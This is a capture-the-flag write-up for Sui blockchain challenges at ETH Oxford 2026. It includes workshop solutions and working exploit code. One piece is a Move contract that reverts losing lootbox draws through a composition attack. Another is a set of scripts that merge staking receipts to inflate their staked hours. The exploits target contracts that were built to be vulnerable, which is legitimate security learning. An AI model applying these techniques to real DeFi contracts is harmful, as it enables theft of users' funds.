# Sui CTF Writeup - ETH Oxford 2026

**Team:** Zain
**Wallet:** `0xb5fd3b667b914bc8c39d42aff4c744f80ad561b826c5262d7e797d7fd8c76783`
**Suiscan:** https://suiscan.xyz/testnet/account/0xb5fd3b667b914bc8c39d42aff4c744f80ad561b826c5262d7e797d7fd8c76783/portfolio
**CTF Package:** `0x96662054f048469d560c7d5d74b79a44c12f79a8e017e45b1ad85857c6891fdf`

---

## Summary

| Challenge | Status | Approach | Cost |
|-----------|--------|----------|------|
| Moving Window | CAPTURED | Timed call during open window | Gas only |
| Merchant | CAPTURED | USDC purchase (5.849 USDC) | 5.849 USDC |
| Lootboxes | CAPTURED | Composition attack exploit contract | 15 USDC + gas |
| Staking | CAPTURED | 169 receipts + merge exploit | ~1.1 SUI staked |

**Total Flags: 4/4**

---

## Part 1: Sui Object Model Workshop (3/3 Exercises)

> Prerequisite for CTF. First 100 completions earn an exclusive Sui hoodie.

Workshop repo: `sui-object-model-workshop/`

---

### Workshop Exercise 1: Handling Returned Objects (SUIII NFT)

**Concept:** Sui best practice is to RETURN objects from Move functions rather than self-transferring inside the function. This enables composability - the PTB caller decides what to do with the object.

**Contract (`sui_nft.move`):**
```move
module sui_nft::sui_nft;

public struct SuiNFT has key, store {
    id: UID,
}

// Returns the NFT instead of self-transferring - best practice!
public fun new(ctx: &mut TxContext): SuiNFT {
    SuiNFT { id: object::new(ctx) }
}
```

Package: `0x57e029acbe322c733c1936ccba3642f27d0525c3883cf4e2742053ba2c5490b0`

**Solution (`return_objects_exercise.ts`):**
```typescript
const tx = new Transaction();

// Task 2: Call sui_nft::new - it RETURNS an NFT (doesn't self-transfer)
const nft = tx.moveCall({
  target: `${PACKAGE_ID}::sui_nft::new`,
});

// Task 3: We handle the returned object - transfer it to ourselves
tx.transferObjects([nft], suiAddress);

// Task 4: Sign and execute
await suiClient.signAndExecuteTransaction({ signer: keypair, transaction: tx });
```

**Key Learning:** When a Move function returns an object, the PTB receives it as a transaction result. We must explicitly handle it (transfer, pass to another call, etc.) or the transaction fails since objects without `drop` can't be discarded.

---

### Workshop Exercise 2: Objects as Input (Counter)

**Concept:** Passing existing on-chain objects as inputs to Move calls. Shared objects (like the counter) can be accessed by anyone. Owned objects require the owner's signature.

**Contract (`counter.move`):**
```move
module counter::counter;

public struct Counter has key {
    id: UID,
    count: u64,
    collected_fees: balance::Balance<SUI>,
    creator: address,
    min_fee: u64,  // minimum 10 MIST
}

// Takes a mutable reference to Counter (shared object) and a fee coin
public fun increment(counter: &mut Counter, fee: coin::Coin<SUI>) {
  counter.count = counter.count + 1;
  assert!(fee.value() >= counter.min_fee, 0);
  counter.collected_fees.join(fee.into_balance());
}
```

Package: `0xb3491c9657444a947c97d7eeccff0d4988b432f8a37e7f9a26fb6ed4fbc3df9a`
Counter Object: `0x8a6f2bc3af32c71a93a35d397fd47c14f67b7aa252002c907df9b172e95c0ec6`

**Solution (`input_objects_exercise.ts`):**
```typescript
const tx = new Transaction();

// Task 2: Split a coin for the fee (min_fee = 10 MIST)
const [feeCoin] = tx.splitCoins(tx.gas, [10]);

// Task 3: Call counter::increment with the shared counter object and fee
tx.moveCall({
  target: `${PACKAGE_ID}::counter::increment`,
  arguments: [
    tx.object(COUNTER_OBJECT_ID),  // shared object - referenced by ID
    feeCoin,                        // coin from splitCoins result
  ],
});

await suiClient.signAndExecuteTransaction({ signer: keypair, transaction: tx });
```

**Key Learnings:**
- `tx.object(id)` references an on-chain object by its ID - the SDK resolves whether it's shared or owned
- `tx.splitCoins(tx.gas, [amount])` splits from the gas coin - a common pattern for creating payment coins
- Shared objects (like Counter) don't need owner permission to access

---

### Workshop Exercise 3: Scavenger Hunt with PTBs

**Concept:** Combining multiple operations in a single PTB - object creation, mutation, and consumption. This is the power of Programmable Transaction Blocks.

**Contracts:**

`key.move` - Simple key with a settable code:
```move
module scavenger::key;

public struct Key { code: u64 }

public fun new(): Key { Key { code: 0 } }
public fun set_code(key: &mut Key, new_code: u64) { key.code = new_code; }
public fun get_code(key: &Key): u64 { key.code }
public(package) fun delete(key: Key) { ... } // only vault can delete
```

`vault.move` - Generic vault that requires a key with correct code:
```move
module scavenger::vault;

public struct Vault<phantom T> has key {
  id: UID,
  balance: balance::Balance<T>,
  withdrawal_amount: u64,
  code: u64,  // must match the key's code
}

public fun withdraw<T>(vault: &mut Vault<T>, key: key::Key, ctx: &mut TxContext): coin::Coin<T> {
  assert_valid_key_code(vault, &key);  // key.code must == vault.code
  key.delete();                         // key is consumed
  coin::from_balance(balance::split(&mut vault.balance, vault.withdrawal_amount), ctx)
}
```

Package: `0x9603a31f4b3f32843b819b8ed85a5dd3929bf1919c6693465ad7468f9788ef39`
Vault Object: `0x8d85d37761d2a4e391c1b547c033eb0e22eb5b825820cbcc0c386b8ecb22be33`
Vault Code: `745223` (found by inspecting vault object fields on Suiscan)

**Solution (`scavenger_hunt_exercise.ts`):**
```typescript
const tx = new Transaction();

// Task 2: Create a new key (starts with code = 0)
const key = tx.moveCall({
  target: `${PACKAGE_ID}::key::new`,
});

// Task 3: Set the key code to match the vault (745223)
tx.moveCall({
  target: `${PACKAGE_ID}::key::set_code`,
  arguments: [
    key,                  // the key we just created (PTB result, passed by mut ref)
    tx.pure.u64(745223),  // the vault's code from on-chain inspection
  ],
});

// Task 4: Withdraw SUI from the vault using the key
const coin = tx.moveCall({
  target: `${PACKAGE_ID}::vault::withdraw`,
  typeArguments: ["0x2::sui::SUI"],  // vault is generic - specify SUI type
  arguments: [
    tx.object(VAULT_ID),  // shared vault object
    key,                   // key is consumed (passed by value)
  ],
});

// Task 5: Transfer the withdrawn SUI to our address
tx.transferObjects([coin], suiAddress);

await suiClient.signAndExecuteTransaction({ signer: keypair, transaction: tx });
```

**Key Learnings:**
- A single PTB can create objects, mutate them, and consume them all in one atomic transaction
- `key` is passed as `&mut` to `set_code` (mutation), then by value to `withdraw` (consumption) - all within the same PTB
- `typeArguments` is needed for generic functions like `withdraw<T>`
- Finding the vault code required on-chain object inspection (Suiscan fields tab)
- This pattern (create + configure + use) is fundamental to Sui composability

---

## Part 2: Capture the Flag (4/4 Flags)

---

## Challenge 1: Moving Window

### Contract Analysis

```move
module ctf::moving_window;

public fun extract_flag(clock: &Clock, ctx: &mut TxContext): flag::Flag {
  let timestamp_seconds = clock.timestamp_ms() / 1000;
  let time_in_hour = timestamp_seconds % 3600;

  assert!(
    (time_in_hour >= 0 && time_in_hour < 300) ||         // 00:00 - 05:00
    (time_in_hour >= 1800 && time_in_hour < 2100),       // 30:00 - 35:00
    EWindowClosed
  );
  flag::new(b"moving_window".to_string(), ctx)
}
```

**Vulnerability:** The window is open during the first 5 minutes (seconds 0-300) or minutes 30-35 (seconds 1800-2100) of each hour. This is just a timing challenge.

### Solution

Script calculates `time_in_hour = (Date.now() / 1000) % 3600` and:
- If inside a window: immediately calls `extract_flag` with Clock object `0x6`
- If within 5 minutes of a window: auto-sleeps until the window opens
- Otherwise: reports next window time

```typescript
// Core transaction
const tx = new Transaction();
const flag = tx.moveCall({
  target: `${PACKAGE_ID}::moving_window::extract_flag`,
  arguments: [tx.object(CLOCK_ID)],
});
tx.transferObjects([flag], address);
```

**Flag Object:** `0x27b404cf27d4e6c2f0deef28f2591d2a92ed6b63b375cf648491a66d726008d6` (source: `moving_window`)

---

## Challenge 2: Merchant

### Contract Analysis

```move
module ctf::merchant;

const COST_PER_FLAG: u64 = 5849000; // 5.849 USDC (6 decimals)

public fun buy_flag(payment_coin: Coin<USDC>, ctx: &mut TxContext): flag::Flag {
  assert!(payment_coin.value() == COST_PER_FLAG, EInvalidPaymentAmount);
  transfer::public_transfer(payment_coin, @0x8e8...);
  flag::new(b"merchant".to_string(), ctx)
}
```

**Challenge:** Need exactly 5.849 USDC on Sui testnet. USDC type is `0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC`.

### Solution

1. Got testnet USDC from Circle faucet (https://faucet.circle.com/ - Sui Testnet option)
2. Used `splitCoins` to create an exact 5,849,000 unit coin from our USDC balance
3. Called `buy_flag` with the exact coin

```typescript
// Merge all USDC coins, split exact payment
const primaryCoin = tx.object(coinId);
if (coins.length > 1) {
  tx.mergeCoins(primaryCoin, otherCoins);
}
const [paymentCoin] = tx.splitCoins(primaryCoin, [5_849_000]);

const flag = tx.moveCall({
  target: `${PACKAGE_ID}::merchant::buy_flag`,
  arguments: [paymentCoin],
});
tx.transferObjects([flag], address);
```

**USDC Source:** Circle testnet faucet (20 USDC per request, rate limited to 1 per 2 hours). Used a second wallet to get additional USDC from a friend's faucet request.

**Flag Object:** `0xeabf905811b81a68f40e54de321077f7ab5c83ae95c9f3e0fdbd139b8193ba5b` (source: `merchant`)

---

## Challenge 3: Lootboxes (Composition Attack)

### Contract Analysis

```move
#[allow(lint(public_random))]
public fun open_lootbox(payment: Coin<USDC>, r: &Random, ctx: &mut TxContext): MaybeFlag {
  assert!(coin::value(&payment) == REQUIRED_PAYMENT, EInsufficientPayment); // 15 USDC
  transfer::public_transfer(payment, @0x8e8...); // payment is consumed

  let random_value = generator.generate_u32_in_range(1, 100);
  MaybeFlag {
    maybe_flag: if (random_value % 4 == 0) {  // 25% chance, NOT 1/100,000!
      option::some(flag::new(...))
    } else { option::none() }
  }
}

public fun extract_flag(maybe_flag: MaybeFlag): flag::Flag {
  assert!(maybe_flag.is_some(), ENoFlag); // ABORTS if no flag
  ...
}
```

**Key Vulnerabilities:**

1. **Misleading odds:** README says "1 in 100,000" but actual code is `random_value % 4 == 0` = **25% chance** (values 4, 8, 12, ..., 100 out of 1-100).

2. **`public` function with `Random`:** The `#[allow(lint(public_random))]` annotation means `open_lootbox` is a `public` function (not `entry`), allowing other Move modules to call it.

3. **Composition attack:** Since `extract_flag` aborts on no flag, we can write an exploit contract that calls `open_lootbox` then immediately `extract_flag`. If there's no flag, the entire transaction aborts - **reverting the USDC payment**. We only lose gas fees (~0.01 SUI per attempt).

### Exploit Contract

Deployed at: `0x3a9f5084ac3c28ee5b0dc2b5c2edd5cb5abf6662ae05746754b2677f0719667a`

```move
#[allow(lint(public_random))]
module exploit::lootbox_exploit;

use sui::coin::Coin;
use sui::random::Random;
use usdc::usdc::USDC;
use ctf::lootboxes;

/// Composition attack: call open_lootbox then immediately extract_flag.
/// If no flag, extract_flag aborts, reverting the USDC payment.
/// We only lose gas on failed attempts.
public fun try_get_flag(
    payment: Coin<USDC>,
    r: &Random,
    ctx: &mut TxContext
) {
    let maybe_flag = lootboxes::open_lootbox(payment, r, ctx);
    let flag = lootboxes::extract_flag(maybe_flag);
    transfer::public_transfer(flag, ctx.sender());
}
```

### Building the Exploit

The exploit contract depends on the CTF package (for `lootboxes` module). Key challenge: resolving Sui framework version conflicts between the CTF package's USDC dependency and our exploit's Sui dependency. Fixed with `override = true`:

```toml
[dependencies]
Sui = { git = "...", rev = "framework/testnet", override = true }
MoveStdlib = { git = "...", rev = "framework/testnet", override = true }
ctf = { local = "../contracts" }
```

### Execution

Script calls `try_get_flag` in a retry loop (max 20 attempts per run):

```typescript
tx.moveCall({
  target: `${EXPLOIT_PACKAGE_ID}::lootbox_exploit::try_get_flag`,
  arguments: [usdcCoin, tx.object('0x8')], // 0x8 = Sui Random object
});
```

- **Run 1:** 20 attempts, all miss (0.3% probability - unlucky!)
- **Run 2:** Hit on attempt 3

Total cost: 15 USDC (one successful payment) + ~23 failed attempts at gas cost only.

**Flag Object:** `0x32dbcde82057269f78cfce21032da9643242b1a940a098daf0ea20c35c6ec5fd` (source: `lootbox`)

---

## Challenge 4: Staking (Receipt Merge Exploit)

### Contract Analysis

```move
const MIN_STAKE_HOURS: u64 = 168;       // 1 week
const MIN_CLAIM_AMOUNT: u64 = 1_000_000_000; // 1 SUI

public fun stake(pool, coin, clock, ctx): StakeReceipt {
  // Creates receipt with hours_staked: 0, last_update_timestamp: now
}

public fun update_receipt(receipt, clock, ctx): StakeReceipt {
  let hours_passed = (current_time - last_update_timestamp) / 3_600_000;
  // Returns new receipt: hours_staked += hours_passed, timestamp = now
}

public fun merge_receipts(r1, r2, clock, ctx): StakeReceipt {
  // VULNERABILITY: Simply adds hours_staked from both receipts!
  // hours_staked: hours1 + hours2
  // amount: amt1 + amt2
}

public fun claim_flag(pool, receipt, clock, ctx): (Flag, Coin<SUI>) {
  let total_hours = receipt.hours_staked + hours_since_last_update;
  assert!(total_hours >= 168);
  assert!(receipt.amount >= 1_000_000_000);
}
```

**Vulnerability:** `merge_receipts` directly adds `hours_staked` from two receipts without any validation. This means:

1. Create N receipts (each with tiny stake, say 6.5M MIST)
2. Wait just 1 hour (not 168!)
3. `update_receipt` on each adds 1 hour: each now has `hours_staked = 1`
4. Merge all N receipts: total `hours_staked = N * 1`
5. If N >= 168, claim succeeds!

### Solution

**Step 1: Create 169 receipts** (in a single PTB)

```typescript
const amountPerReceipt = Math.floor(1_100_000_000 / 169); // ~6.5M MIST each

for (let i = 0; i < 169; i++) {
  const [coin] = tx.splitCoins(tx.gas, [amountPerReceipt]);
  const receipt = tx.moveCall({
    target: `${PACKAGE_ID}::staking::stake`,
    arguments: [tx.object(STAKING_POOL_ID), coin, tx.object(CLOCK_ID)],
  });
  tx.transferObjects([receipt], address);
}
```

**Step 2: Wait 1 hour** (for `update_receipt` to credit 1 hour per receipt)

**Step 3: Update + Merge + Claim** (single PTB with 338 commands)

```typescript
// Update all 169 receipts (each gets +1 hour)
for (const id of receiptIds) {
  updatedReceipts.push(tx.moveCall({
    target: `${PACKAGE_ID}::staking::update_receipt`,
    arguments: [tx.object(id), tx.object(CLOCK_ID)],
  }));
}

// Merge all into one (accumulates: 169 * 1 = 169 hours)
let merged = updatedReceipts[0];
for (let i = 1; i < updatedReceipts.length; i++) {
  merged = tx.moveCall({
    target: `${PACKAGE_ID}::staking::merge_receipts`,
    arguments: [merged, updatedReceipts[i], tx.object(CLOCK_ID)],
  });
}

// Claim: 169 hours >= 168, amount 1.1 SUI >= 1 SUI
const [flag, coin] = tx.moveCall({
  target: `${PACKAGE_ID}::staking::claim_flag`,
  arguments: [tx.object(STAKING_POOL_ID), merged, tx.object(CLOCK_ID)],
});
```

**Key Technical Detail:** The gRPC client (`SuiGrpcClient`) simulation failed because the dev-inspect clock was too close to the receipt creation timestamp. The fix was using the JSON-RPC client (`SuiJsonRpcClient`) which submits the transaction without simulation, letting on-chain execution use the real clock.

**Staking Pool:** `0x9576f25dd7b1ce05d23e6a87eba55f5882a0192bcff75d51a29e775a0256d96a`
**Claim TX:** `GMwqHYux2i6niTRrAdR3Qf8kAXY6e1TgZoTW7wPkAwF5`
**Flag Object:** `0x0031ade8757300e6ab65a9ffd9aea4409aeeb00a58730fb2e09dc5e259a69256` (source: `staking`)

---

## Technical Challenges & Lessons Learned

### 1. Sui SDK v2 (gRPC Client) API Differences

The CTF scripts use `@mysten/sui` v2.3.0 which defaults to `SuiGrpcClient`. This has a significantly different API from the older `SuiClient`:

| Operation | Old API | gRPC API |
|-----------|---------|----------|
| Get coins | `getCoins()` returns `{ data: [...] }` | `listCoins()` returns `{ objects: [...] }` |
| Coin ID field | `coinObjectId` | `objectId` |
| Balance | `{ totalBalance }` | `{ balance: { coinBalance, balance } }` |
| Owned objects | `getOwnedObjects()` | `listOwnedObjects()` (filter param ignored) |
| TX result | `{ digest: "..." }` | digest in nested structure |

### 2. Circle USDC Testnet Faucet

- URL: https://faucet.circle.com/ (select Sui Testnet)
- Provides 20 USDC per request
- Rate limited: 1 request per 2 hours per address
- Workaround: Generated second keypair, had a friend request USDC to the new address, then transferred to main wallet

### 3. Move Dependency Conflicts

The exploit contract depends on the CTF package (which depends on USDC, which depends on Sui framework). Building with a different Sui framework version causes "multiple versions" errors. Fixed by adding `override = true` to both `Sui` and `MoveStdlib` dependencies.

### 4. PTB Simulation vs On-Chain Execution

The gRPC client's simulation (dev-inspect) uses a different clock than actual on-chain execution. This caused staking claims to fail in simulation even when they would succeed on-chain. Solution: Use `SuiJsonRpcClient` which submits without pre-simulation.

---

## Files Created

### Move Contracts
- `exploit/sources/lootbox_exploit.move` - Composition attack contract

### TypeScript Solutions
- `scripts/src/moving_window.ts` - Time window flag extraction with auto-wait
- `scripts/src/merchant.ts` - USDC purchase with coin merge/split
- `scripts/src/lootboxes.ts` - Exploit retry loop (composition attack)
- `scripts/src/staking.ts` - Receipt creation + update/merge/claim
- `scripts/src/staking_claim.ts` - Staking claim with auto-wait for 1hr

### Utilities
- `scripts/src/gen_keypair2.ts` - Second wallet generation
- `scripts/src/transfer_usdc.ts` - USDC transfer between wallets
- `scripts/src/verify_flags.ts` - On-chain flag verification
- `scripts/src/check_balance.ts` - Balance checker
- `scripts/src/check_receipts.ts` - Receipt enumeration

---

## On-Chain Proof

All 4 flags are `ctf::flag::Flag` objects owned by wallet `0xb5fd3b667b914bc8c39d42aff4c744f80ad561b826c5262d7e797d7fd8c76783`:

| Challenge | Flag Object ID | Source Field |
|-----------|---------------|--------------|
| Merchant | `0xeabf905811b81a68f40e54de321077f7ab5c83ae95c9f3e0fdbd139b8193ba5b` | `merchant` |
| Moving Window | `0x27b404cf27d4e6c2f0deef28f2591d2a92ed6b63b375cf648491a66d726008d6` | `moving_window` |
| Lootboxes | `0x32dbcde82057269f78cfce21032da9643242b1a940a098daf0ea20c35c6ec5fd` | `lootbox` |
| Staking | `0x0031ade8757300e6ab65a9ffd9aea4409aeeb00a58730fb2e09dc5e259a69256` | `staking` |

Verify at: https://suiscan.xyz/testnet/account/0xb5fd3b667b914bc8c39d42aff4c744f80ad561b826c5262d7e797d7fd8c76783/portfolio
